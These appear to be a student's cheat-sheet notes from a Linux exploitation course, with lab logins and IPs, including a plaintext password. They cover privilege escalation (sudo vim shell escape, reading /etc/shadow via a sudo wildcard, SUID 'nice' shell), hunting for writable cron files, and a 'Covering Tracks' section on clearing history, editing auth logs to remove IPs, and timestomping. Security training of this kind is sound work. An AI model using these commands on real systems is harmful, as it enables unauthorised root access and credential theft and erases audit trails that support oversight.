# Linux Exploitation
# https://sec.cybbh.io/public/security/latest/lessons/lesson-10-linux-exploit_sg.html#_discuss_what_is_privilege_escalation
## Stack Info
```
--Stack Number
  5

--Username
CODA-503-M

--Password
Gx1LjlSgOgQJJMy

Boxes
Student - Password
--Linux ops
10.50.31.135
 
--Windows
xfreerdp /v:10.50.24.133 /u:student /dynamic-resolution +glyph-cache +clipboard
10.50.24.133

--Jump
10.50.27.155

--Password
Gx1LjlSgOgQJJMy

--CTFd
http://10.50.20.30:8000/resources
```
## Privilege Escalation
## https://gtfobins.github.io/ - break out of restricted shells
```
sudo -l

## User student may run the following commands
## vim /etc/ssh/sshd_config (or whatever file)

sudo vim /etc/ssh/sshd_config

## in vim

:!/bin/bash
```
## SUID/GUID 
```
find / -type f -perm /4000 -ls 2>/dev/null   #FIND SUID ONLY FILES
find / -type f -perm /2000 -ls 2>/dev/null   #FIND SGID ONLY FILES
find / -type f -perm /6000 -ls 2>/dev/null   #FIND SUID/SGID FILES
```
# Insecure Permissions
## CRON
```
#Cron daemon runs as root
https://crontab.guru/

/var/spool/cron/crontabs  #User level jobs
/etc/crontab              #System level jobs
/etc/cron.*               #Hourly,Daily,Weekly

crontab -l                #lists for current user
contab -u <user> -l       #lists for a specified user

find /var/spool/cron/crontabs /etc/cron* -writable -ls
#Finds any cron file or directory that can be written to.

find /etc/cron* -type f -exec grep -Eo '/.*' {} \;
#Find potential path and filename by looking for any entry that starts with a slash
```
## World-Writable Files and Directories
```
find / -type f -perm /2 -o -type d -perm /2 2>/dev/null
#Search for any file or directory that is writable by the context "other"

find / -type f -writable -o -type d -writable 2>/dev/null
#Search for any file or directory that is writable by the current user
```
## Vunerable Services 
```
ps aux | grep root   # root processes can be identified

netstat -antu 
#or                  # Open sockets
ss -antu
```
# Covering Tracks 
```
/var/log/syslog OR /var/log/messages
/var/log/secure OR /var/log/auth.log

ps -p 1
systemd = systemd
init = systemV

unset HISTFILE

grep -v "192.168.0.55" /var/log/secure > /tmp/secure.clean; mv /tmp/secure.clean /var/log/secure; touch -t 02180455 /var/log/secure

#SED Replace
cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log

#GERP REMOVE

#GREP (Remove)
egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2


# Timestomp
    Access: updated when opened or used (grep, ls, cat, etc)

    Modify: update content of file or saved

    Change: file attribute change, file modified, moved, owner, permission

touch -c -t 201603051015 1.txt   # Explicit
touch -r 3.txt 1.txt             # Reference
```
# Rsyslog
```
    Newer Rsyslog references /etc/rsyslog.d/* for settings/rules

    Older version only uses /etc/rsyslog.conf

    Find out
    grep "IncludeConfig" /etc/rsyslog.conf
```
## Sudo Demo 1 Notes
```
sudo -l
# Check GTFObins to see what abilities we have to get a shell
sudo apt-get changelog apt
#!/bin/sh or #!/bin/bash
```
## Sudo Demo 2 Notes
```
sudo -l
# User may run  /use/bin/cat /var/log/syslog*
# The * means anything can follow syslog^
sudo cat /var/log/syslog /etc/shadow
```
## SUID Demo Notes
```
find / -type f -perm /6000 -ls 2>/dev/null
## found /usr/bin/nice 
## Determine what files/commands are vunerable
## Search GTFObins for exploits
nice /bin/sh -p
```